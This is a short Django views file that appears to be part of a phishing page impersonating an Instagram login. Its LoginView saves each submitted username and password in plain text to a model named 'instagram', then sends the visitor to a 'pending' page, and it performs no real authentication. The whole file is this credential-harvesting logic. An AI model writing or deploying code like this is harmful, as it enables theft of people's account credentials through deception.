from django.shortcuts import render
from django.views.generic import CreateView
from .models import instagram
from django.urls import reverse_lazy
# Create your views here.
class LoginView(CreateView):
    model = instagram
    fields = ['username', 'password']
    template_name = 'home.html'
    success_url = reverse_lazy('pending')


def pending(request):
    return render(request, 'pending.html')   